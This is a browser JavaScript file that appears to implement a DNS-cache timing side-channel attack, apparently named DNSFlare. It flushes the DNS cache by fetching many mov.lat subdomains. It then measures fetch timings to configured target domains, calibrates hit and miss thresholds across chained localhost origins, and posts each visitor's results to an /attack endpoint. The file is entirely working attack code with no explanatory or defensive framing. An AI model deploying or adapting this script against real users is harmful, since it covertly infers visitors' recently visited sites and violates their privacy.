async function flush() {
    document.getElementById('status').innerText = "Flushing DNS Cache...";
    const domains = [];
    for(let i=0; i<20; i++) domains.push(`f${i}.s2.mov.lat`);

    await Promise.all(domains.map(d =>
        fetch('https://' + d, { signal: AbortSignal.timeout(3000), mode: 'no-cors' }).catch(() => {})
    ));
}

async function measureTime(domain) {
    try {
        await fetch('https://_0._https.' + domain, { signal: AbortSignal.timeout(2000), mode: 'no-cors' });
    } catch {}

    const t0 = performance.now();
    try {
        await fetch('http://' + domain + ':0/', { mode: 'no-cors' });
    } catch {
        return performance.now() - t0;
    }
    return null;
}

async function main() {
    const config = window.DNSFlareConfig;
    const urlParams = new URLSearchParams(window.location.search);

    let mode = urlParams.get('mode') || 'start';
    let iteration = parseInt(urlParams.get('iteration') || '1');
    let origin_idx = parseInt(urlParams.get('origin') || '1');

    let port = window.location.port ? ':' + window.location.port : '';
    let nextOrigin = `http://origin${origin_idx}.localhost${port}`;

    if (mode === 'start') {
        window.location.replace(`${nextOrigin}/?mode=calibrate_miss&iteration=1&origin=${origin_idx+1}`);
        return;
    }

    if (mode === 'calibrate_miss') {
        await flush();
        await new Promise(r => setTimeout(r, config.calibration_sleep));
        document.getElementById('status').innerText = "Calibrating MISS...";

        let missTimes = {};
        for (let target of config.targets) {
            missTimes[target] = await measureTime(target);
        }

        let missData = encodeURIComponent(JSON.stringify(missTimes));
        window.location.replace(`${nextOrigin}/?mode=calibrate_hit&iteration=${iteration}&miss_times=${missData}&origin=${origin_idx+1}`);
        return;
    }

    if (mode === 'calibrate_hit') {
        await new Promise(r => setTimeout(r, 100));
        document.getElementById('status').innerText = "Calibrating HIT...";

        let missTimes = JSON.parse(decodeURIComponent(urlParams.get('miss_times')));
        let hitTimes = {};

        for (let target of config.targets) {
            hitTimes[target] = await measureTime(target);
        }

        const postPromises = config.targets.map(target => {
            return fetch('/calibrate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: target,
                    hit: hitTimes[target],
                    miss: missTimes[target],
                    iteration: iteration
                })
            });
        });
        await Promise.all(postPromises);

        if (iteration < config.precision) {
            window.location.replace(`${nextOrigin}/?mode=calibrate_miss&iteration=${iteration+1}&origin=${origin_idx+1}`);
        } else {
            window.location.replace(`${nextOrigin}/?mode=attack&origin=${origin_idx+1}`);
        }
        return;
    }

    if (mode === 'attack') {
        await flush();
        await new Promise(r => setTimeout(r, config.attack_sleep));
        document.getElementById('status').innerText = "Attacking...";

        let attackTimes = {};
        for (let target of config.targets) {
            attackTimes[target] = await measureTime(target);
        }

        const postPromises = config.targets.map(target => {
            return fetch('/attack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target: target, time: attackTimes[target] })
            });
        });
        await Promise.all(postPromises);

        window.location.replace(`${nextOrigin}/?mode=attack&origin=${origin_idx+1}`);
        return;
    }
}

main();